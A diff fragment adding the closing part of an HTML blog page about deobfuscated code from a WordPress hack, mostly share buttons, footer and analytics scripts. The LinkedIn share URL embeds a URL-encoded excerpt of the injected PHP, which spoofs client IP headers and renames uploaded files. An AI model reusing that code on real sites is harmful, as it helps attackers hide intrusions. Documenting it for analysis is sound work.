+                      <path transform="scale(0.014,-0.014) translate(0,-1670)" d="M1792 826v-794q0 -66 -47 -113t-113 -47h-1472q-66 0 -113 47t-47 113v794q44 -49 101 -87q362 -246 497 -345q57 -42 92.5 -65.5t94.5 -48t110 -24.5h1h1q51 0 110 24.5t94.5 48t92.5 65.5q170 123 498 345q57 39 100 87zM1792 1120q0 -79 -49 -151t-122 -123 q-376 -261 -468 -325q-10 -7 -42.5 -30.5t-54 -38t-52 -32.5t-57.5 -27t-50 -9h-1h-1q-23 0 -50 9t-57.5 27t-52 32.5t-54 38t-42.5 30.5q-91 64 -262 182.5t-205 142.5q-62 42 -117 115.5t-55 136.5q0 78 41.5 130t118.5 52h1472q65 0 112.5 -47t47.5 -113z"/>
+                  </svg>
+              </span>
+              <span class="text">Email</span>
+          </a>
+      </li>
+      <li class="facebook">
+          <a href="https://www.facebook.com/sharer/sharer.php?u=http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/" class="popup">
+              <span class="icon">
+                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+                      <path d="M27.825,4.783c0-2.427-2.182-4.608-4.608-4.608H4.783c-2.422,0-4.608,2.182-4.608,4.608v18.434 c0,2.427,2.181,4.608,4.608,4.608H14V17.379h-3.379v-4.608H14v-1.795c0-3.089,2.335-5.885,5.192-5.885h3.718v4.608h-3.726 c-0.408,0-0.884,0.492-0.884,1.236v1.836h4.609v4.608h-4.609v10.446h4.916c2.422,0,4.608-2.188,4.608-4.608V4.783z"/>
+                  </svg>
+              </span>
+              <span class="text">Facebook</span>
+          </a>
+      </li>
+			<li class="twitter">
+          <a href="http://twitter.com/home?status=Deobfuscated%20code%20from%20the%20WordPress%20hack%20http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/" class="popup">
+              <span class="icon">
+                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+		                  <path d="M24.253,8.756C24.689,17.08,18.297,24.182,9.97,24.62c-3.122,0.162-6.219-0.646-8.861-2.32 c2.703,0.179,5.376-0.648,7.508-2.321c-2.072-0.247-3.818-1.661-4.489-3.638c0.801,0.128,1.62,0.076,2.399-0.155 C4.045,15.72,2.215,13.6,2.115,11.077c0.688,0.275,1.426,0.407,2.168,0.386c-2.135-1.65-2.729-4.621-1.394-6.965 C5.575,7.816,9.54,9.84,13.803,10.071c-0.842-2.739,0.694-5.64,3.434-6.482c2.018-0.623,4.212,0.044,5.546,1.683 c1.186-0.213,2.318-0.662,3.329-1.317c-0.385,1.256-1.247,2.312-2.399,2.942c1.048-0.106,2.069-0.394,3.019-0.851 C26.275,7.229,25.39,8.196,24.253,8.756z"/>
+                  </svg>
+              </span>
+              <span class="text">Twitter</span>
+          </a>
+      </li>
+			<li class="linkedin">
+          <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/&amp;title=Deobfuscated%20code%20from%20the%20WordPress%20hack&amp;summary=This%20page%20is%20part%20of%20the%20blogpost%20About%20that%20time%20I%20dealt%20with%20a%20bunch%20of%20hackers%20on%20a%20WordPress.%20The%20following%20is%20the%20deobfuscated%20version%20of%20this.%20%26lt%3b%3fphp%20if%20%28isset%28%24_SERVER%29%29%20%7b%20%24_SERVER%5b%27PHP_SELF%27%5d%20%3d%20%26quot%3b%2f%26quot%3b%3b%20%24_SERVER%5b%27REMOTE_ADDR%27%5d%20%3d%20%26quot%3b127.0.0.1%26quot%3b%3b%20if%20%28%21empty%28%24_SERVER%5b%27HTTP_X_FORWARDED_FOR%27%5d%29%29%20%7b%20%24_SERVER%5b%27HTTP_X_FORWARDED_FOR%27%5d%20%3d%20%26quot%3b127.0.0.1%26quot%3b%3b%20%7d%20%7d%20if%20%28isset%28%24_FILES%29%29%20%7b%20foreach%20%28%24_FILES%20as%20%24key%20%3d%26gt%3b%20%24file%29%20%7b%20if%20%28%21strpos%28%24file%5b%27name%27%5d%2c%20%26quot%3b.jpg%26quot%3b%29%29%20%7b%20%24filename%20%3d%20alter_macros%28%24file%5b%27name%27%5d%29%3b%20%24filename%20%3d%20num_macros%28%24filename%29%3b%20%24filename%20%3d%20xnum_macros%28%24filename%29%3b%20%24_FILES%5b%24key%5d%5b%26quot%3bname%26quot%3b%5d%20%3d%20%24filename%3b%20%7d%20%7d%20%7d%20function%20custom_strip_tags%28%24text%29%20%7b%20%24text%20%3d%20strip_tags%28%24text%2c%20%27%26lt%3ba%26gt%3b%27%29%3b%20%24text%20%3d%20str_replace%28%26quot%3b%26lt%3ba%20href%3d%5c%26quot%3b%26quot%3b%2c%20%26quot%3b%5b%20%26quot%3b%2c%20%24text%29%3b%20%24text%20%3d%20str_replace%28%26quot%3b%26lt%3b%2fa%26gt%3b%26quot%3b%2c%20%26quot%3b%26quot%3b%2c%20%24text%29%3b%20%24text%20%3d%20str_replace%28%26quot%3b%5c%26quot%3b%26gt%3b%26quot%3b%2c%20%26quot%3b%20%5d%20%26quot%3b%2c%20%24text%29%3b%20return%20%24text%3b%20%7d%20function%20is_ip%28%24str%29%20%7b%20return%20preg_match%28%26quot%3b%2f%5e%28%5b1-9%5d%7c%5b1-9%5d%5b0-9%5d%7c1%5b0-9%5d%5b0-9%5d%7c2%5b0-4%5d%5b0-9%5d%7c25%5b0-5%5d%29%28%5c.%28%5b0-9%5d%7c%5b1-9%5d%5b0-9%5d%7c1%5b0-9%5d%5b0-9%5d%7c2%5b0-4%5d%5b0-9%5d%7c25%5b0-5%5d%29%29%7b3%7d%24%2f%26quot%3b%2c%20%24str%29%3b%20%7d%20function%20from_host%28%24content%29%20%7b%20%24host%20%3d%20preg_replace%28%27%2f%5e%28www%7cftp%29%5c.%2fi%27%2c%20%27%27%2c%20%40%24_SERVER%5b%27HTTP_HOST%27%5d%29%3b%20if%20%28is_ip%28%24host%29%29%20%7b%20return%20%24content%3b%20%7d%20%24tokens%20%3d%20explode%28%26quot%3b%40%26quot%3b%2c%20%24content%29%3b%20%24content%20%3d%20%24tokens%5b0%5d%20...." class="popup">
+              <span class="icon">
+                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+                      <path d="M25.424,15.887v8.447h-4.896v-7.882c0-1.979-0.709-3.331-2.48-3.331c-1.354,0-2.158,0.911-2.514,1.803 c-0.129,0.315-0.162,0.753-0.162,1.194v8.216h-4.899c0,0,0.066-13.349,0-14.731h4.899v2.088c-0.01,0.016-0.023,0.032-0.033,0.048 h0.033V11.69c0.65-1.002,1.812-2.435,4.414-2.435C23.008,9.254,25.424,11.361,25.424,15.887z M5.348,2.501 c-1.676,0-2.772,1.092-2.772,2.539c0,1.421,1.066,2.538,2.717,2.546h0.032c1.709,0,2.771-1.132,2.771-2.546 C8.054,3.593,7.019,2.501,5.343,2.501H5.348z M2.867,24.334h4.897V9.603H2.867V24.334z"/>
+                  </svg>
+              </span>
+              <span class="text">LinkedIn</span>
+          </a>
+      </li>
+      <li class="tumblr">
+					<script>
+						document.write('<a href="http://www.tumblr.com/share?v=3&amp;u=' + encodeURIComponent('http:\/\/sa.muel.be\/addendum\/2015\/deobfuscated-code-from-the-wordpress-hack\/') + '&amp;t=Deobfuscated code from the WordPress hack" class="popup">');
+					</script>
+              <span class="icon">
+                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+											<path d="M18.02 21.842c-2.029 0.052-2.422-1.396-2.439-2.446v-7.294h4.729V7.874h-4.71V1.592c0 0-3.653 0-3.714 0 s-0.167 0.053-0.182 0.186c-0.218 1.935-1.144 5.33-4.988 6.688v3.637h2.927v7.677c0 2.8 1.7 6.7 7.3 6.6 c1.863-0.03 3.934-0.795 4.392-1.453l-1.22-3.539C19.595 21.6 18.7 21.8 18 21.842z"/>
+									</svg>
+              </span>
+              <span class="text">Tumblr</span>
+          <script>document.write('</a>');</script>
+      </li>
+      <li class="reddit">
+          <a href="http://www.reddit.com/submit?url=http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/">
+              <span class="icon">
+                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+											<g>
+													<path d="M11.794 15.316c0-1.029-0.835-1.895-1.866-1.895c-1.03 0-1.893 0.865-1.893 1.895s0.863 1.9 1.9 1.9 C10.958 17.2 11.8 16.3 11.8 15.316z"/>
+													<path d="M18.1 13.422c-1.029 0-1.895 0.864-1.895 1.895c0 1 0.9 1.9 1.9 1.865c1.031 0 1.869-0.836 1.869-1.865 C19.969 14.3 19.1 13.4 18.1 13.422z"/>
+													<path d="M17.527 19.791c-0.678 0.678-1.826 1.006-3.514 1.006c-0.004 0-0.009 0-0.014 0c-0.004 0-0.01 0-0.015 0 c-1.686 0-2.834-0.328-3.51-1.005c-0.264-0.265-0.693-0.265-0.958 0c-0.264 0.265-0.264 0.7 0 1 c0.943 0.9 2.4 1.4 4.5 1.402c0.005 0 0 0 0 0c0.005 0 0 0 0 0c2.066 0 3.527-0.459 4.47-1.402 c0.265-0.264 0.265-0.693 0.002-0.958C18.221 19.5 17.8 19.5 17.5 19.791z"/>
+													<path d="M27.707 13.267c0-1.785-1.453-3.237-3.236-3.237c-0.793 0-1.518 0.287-2.082 0.761c-2.039-1.295-4.646-2.069-7.438-2.219 l1.483-4.691l4.062 0.956c0.071 1.4 1.3 2.6 2.7 2.555c1.488 0 2.695-1.208 2.695-2.695C25.881 3.2 24.7 2 23.2 2 c-1.059 0-1.979 0.616-2.42 1.508l-4.633-1.091c-0.344-0.081-0.693 0.118-0.803 0.455l-1.793 5.7 C10.548 8.6 7.7 9.4 5.6 10.75C5.006 10.3 4.3 10 3.5 10.029c-1.785 0-3.237 1.452-3.237 3.2 c0 1.1 0.6 2.1 1.4 2.69c-0.04 0.272-0.061 0.551-0.061 0.831c0 2.3 1.3 4.4 3.7 5.9 c2.299 1.5 5.3 2.3 8.6 2.325c3.228 0 6.271-0.825 8.571-2.325c2.387-1.56 3.7-3.66 3.7-5.917 c0-0.26-0.016-0.514-0.051-0.768C27.088 15.5 27.7 14.4 27.7 13.267z M23.186 3.355c0.74 0 1.3 0.6 1.3 1.3 c0 0.738-0.6 1.34-1.34 1.34s-1.342-0.602-1.342-1.34C21.844 4 22.4 3.4 23.2 3.355z M1.648 13.3 c0-1.038 0.844-1.882 1.882-1.882c0.31 0 0.6 0.1 0.9 0.209c-1.049 0.868-1.813 1.861-2.26 2.9 C1.832 14.2 1.6 13.8 1.6 13.267z M21.773 21.57c-2.082 1.357-4.863 2.105-7.831 2.105c-2.967 0-5.747-0.748-7.828-2.105 c-1.991-1.301-3.088-3-3.088-4.782c0-1.784 1.097-3.484 3.088-4.784c2.081-1.358 4.861-2.106 7.828-2.106 c2.967 0 5.7 0.7 7.8 2.106c1.99 1.3 3.1 3 3.1 4.784C24.859 18.6 23.8 20.3 21.8 21.57z M25.787 14.6 c-0.432-1.084-1.191-2.095-2.244-2.977c0.273-0.156 0.59-0.245 0.928-0.245c1.035 0 1.9 0.8 1.9 1.9 C26.354 13.8 26.1 14.3 25.8 14.605z"/>
+											</g>
+									</svg>
+              </span>
+              <span class="text">Reddit</span>
+          </a>
+      </li>
+      <li class="googleplus">
+          <a href="https://plus.google.com/share?url=http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/" class="popup">
+              <span class="icon">
+                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+                      <g>
+                          <path d="M14.703,15.854l-1.219-0.948c-0.372-0.308-0.88-0.715-0.88-1.459c0-0.748,0.508-1.223,0.95-1.663 c1.42-1.119,2.839-2.309,2.839-4.817c0-2.58-1.621-3.937-2.399-4.581h2.097l2.202-1.383h-6.67c-1.83,0-4.467,0.433-6.398,2.027 C3.768,4.287,3.059,6.018,3.059,7.576c0,2.634,2.022,5.328,5.604,5.328c0.339,0,0.71-0.033,1.083-0.068 c-0.167,0.408-0.336,0.748-0.336,1.324c0,1.04,0.551,1.685,1.011,2.297c-1.524,0.104-4.37,0.273-6.467,1.562 c-1.998,1.188-2.605,2.916-2.605,4.137c0,2.512,2.358,4.84,7.289,4.84c5.822,0,8.904-3.223,8.904-6.41 c0.008-2.327-1.359-3.489-2.829-4.731H14.703z M10.269,11.951c-2.912,0-4.231-3.765-4.231-6.037c0-0.884,0.168-1.797,0.744-2.511 c0.543-0.679,1.489-1.12,2.372-1.12c2.807,0,4.256,3.798,4.256,6.242c0,0.612-0.067,1.694-0.845,2.478 c-0.537,0.55-1.438,0.948-2.295,0.951V11.951z M10.302,25.609c-3.621,0-5.957-1.732-5.957-4.142c0-2.408,2.165-3.223,2.911-3.492 c1.421-0.479,3.25-0.545,3.555-0.545c0.338,0,0.52,0,0.766,0.034c2.574,1.838,3.706,2.757,3.706,4.479 c-0.002,2.073-1.736,3.665-4.982,3.649L10.302,25.609z"/>
+                          <polygon points="23.254,11.89 23.254,8.521 21.569,8.521 21.569,11.89 18.202,11.89 18.202,13.604 21.569,13.604 21.569,17.004 23.254,17.004 23.254,13.604 26.653,13.604 26.653,11.89"/>
+                      </g>
+                  </svg>
+              </span>
+              <span class="text">Google+</span>
+          </a>
+      </li>
+      <li class="pinterest">
+          <script>
+						var imgurl = "http:\/\/sa.muel.be\/logo.png";
+						var firstimg = document.getElementsByClassName("addendum")[0].getElementsByTagName("img")[0];
+						if (firstimg !== undefined) {
+							imgurl = firstimg.src;
+						}
+						document.write('<a href="http://pinterest.com/pin/create/button/?url=http:\/\/sa.muel.be\/addendum\/2015\/deobfuscated-code-from-the-wordpress-hack\/&amp;media=' + imgurl + '&amp;description=Deobfuscated code from the WordPress hack" class="popup">');
+					</script>
+              <span class="icon">
+                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
+		                  <path d="M14.021,1.57C6.96,1.57,1.236,7.293,1.236,14.355c0,7.062,5.724,12.785,12.785,12.785c7.061,0,12.785-5.725,12.785-12.785 C26.807,7.294,21.082,1.57,14.021,1.57z M15.261,18.655c-1.161-0.09-1.649-0.666-2.559-1.219c-0.501,2.626-1.113,5.145-2.925,6.458 c-0.559-3.971,0.822-6.951,1.462-10.116c-1.093-1.84,0.132-5.545,2.438-4.632c2.837,1.123-2.458,6.842,1.099,7.557 c3.711,0.744,5.227-6.439,2.925-8.775c-3.325-3.374-9.678-0.077-8.897,4.754c0.19,1.178,1.408,1.538,0.489,3.168 C7.165,15.378,6.53,13.7,6.611,11.462c0.131-3.662,3.291-6.227,6.46-6.582c4.007-0.448,7.771,1.474,8.29,5.239 c0.579,4.255-1.816,8.865-6.102,8.533L15.261,18.655z"/>
+                  </svg>
+              </span>
+              <span class="text">Pinterest</span>
+          <script>document.write('</a>');</script>
+      </li>
+      <li class="pocket">
+          <a href="https://getpocket.com/save?url=http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/"  class="popup">
+              <span class="icon">
+                  <svg width="32px" height="28px" viewBox="0 0 32 28" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns">
+                      <path d="M28.7817528,0.00172488695 C30.8117487,0.00431221738 31.9749312,1.12074529 31.9644402,3.10781507 C31.942147,6.67703739 32.1336065,10.2669583 31.8057648,13.8090137 C30.7147076,25.5813672 17.2181194,31.8996281 7.20714461,25.3808491 C2.71833574,22.4571656 0.196577202,18.3122624 0.0549495772,12.9357897 C-0.0342233715,9.5774348 0.00642900214,6.21519891 0.0300336062,2.85555035 C0.0405245414,1.1129833 1.21157517,0.0146615391 3.01995012,0.00819321302 C7.34746087,-0.00603710433 11.6775944,0.00431221738 16.0064164,0.00172488695 C20.2644248,0.00172488695 24.5237444,-0.00215610869 28.7817528,0.00172488695 L28.7817528,0.00172488695 Z M8.64885184,7.85611511 C7.38773662,7.99113854 6.66148108,8.42606978 6.29310958,9.33228474 C5.90114134,10.2969233 6.17774769,11.1421181 6.89875951,11.8276216 C9.35282156,14.161969 11.8108164,16.4924215 14.2976518,18.7943114 C15.3844131,19.7966007 16.5354102,19.7836177 17.6116843,18.7813283 C20.0185529,16.5495467 22.4070683,14.2982907 24.7824746,12.0327533 C25.9845979,10.8850542 26.1012707,9.56468083 25.1469132,8.60653379 C24.1361858,7.59255976 22.8449191,7.6743528 21.5890476,8.85191291 C19.9936451,10.3488554 18.3680912,11.8172352 16.8395462,13.3777945 C16.1342655,14.093159 15.7200114,14.0048744 15.0566806,13.3440386 C13.4599671,11.7484252 11.8081945,10.2060421 10.1262706,8.70001155 C9.65564653,8.27936164 9.00411403,8.05345704 8.64885184,7.85611511 L8.64885184,7.85611511 L8.64885184,7.85611511 Z"></path>
+                  </svg>
+              </span>
+              <span class="text">Pocket</span>
+          </a>
+      </li>
+  </ul>
+</div>
+
+    <div>
+  <h5>About the author</h5>
+  <section>
+    <p>Samuel Debruyn is a C# developer who builds RESTful APIs and cross platform apps. <a href="http://sa.muel.be/about">More info</a></p>
+  </section>
+</div>
+</article>  
+
+</main>
+		<footer id="footer">
+			<p id="footer-message">&copy; Samuel Debruyn. All rights reserved. Source code available on <a href="https://github.com/SamuelDebruyn/samueldebruyn.github.io" target="_blank">GitHub</a>.</p>
+		</footer>
+
+    <script>
+      (function(c,f){asyncLoader=function(i,h){i.foreach(function(k,j){e(j,d(j),h)});if(typeof h.callback=="function"){var g=setInterval(function(){if(f.readyState==="complete"){clearInterval(g);h.callback()}},10)}};var d=function(g){var h=g.split(".");return h[h.length-1]},e=function(h,i,g){switch(i){case"js":a(h,g);break;case"css":b(h);break;default:break}},a=function(i,h){var g=document.createElement("script");g.type="text/javascript";g.async=true;g.src=i;document.getElementsByTagName("head")[0].appendChild(g)},b=function(g){var h=document.createElement("link");h.type="text/css";h.rel="stylesheet";h.href=g;document.getElementsByTagName("head")[0].appendChild(h)};Array.prototype.foreach=function(h){for(var g=0;g<this.length;g++){h(g,this[g])}}})(this,document);
+
+      var WebFontConfig={google:{families:["Lato:300italic,700italic,300,400,700","Oswald","PT Sans:400,700"]}};
+      asyncLoader([
+        "//netdna.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.css",
+        "//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js",
+        "//cdnjs.cloudflare.com/ajax/libs/webfont/1.5.16/webfontloader.js",
+        "//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"
+      ],{
+        callback:function(){
+          asyncLoader([
+            "http:\/\/sa.muel.be\/css/rrssb.css",
+            "http:\/\/sa.muel.be\/js/gist.min.js", 
+            "http:\/\/sa.muel.be\/js/rrssb.min.js",
+            "//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/styles/default.min.css"
+          ], { callback:function() {
+              hljs.initHighlighting();
+              
+              
+                var isMobile = window.matchMedia("only screen and (max-width: 800px)");
+                if(isMobile.matches) {
+                    $("html, body").animate({scrollTop: $('#content').offset().top }, 500);
+                }
+              
+          }});
+        }
+      });
+    </script>
+	
+    <script>
+    	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      	ga('create', 'UA-51718684-1', 'auto');
+      	ga('send', 'pageview');
+    </script>
+  
+  
+    <script>
+      (function() {
+        var cx = '008574538854808371368:vdbkljdpip8';
+        var gcse = document.createElement('script');
+        gcse.type = 'text/javascript';
+        gcse.async = true;
+        gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+            '//cse.google.com/cse.js?cx=' + cx;
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(gcse, s);
+      })();
+    </script>
+    
+	</body>
+</html>
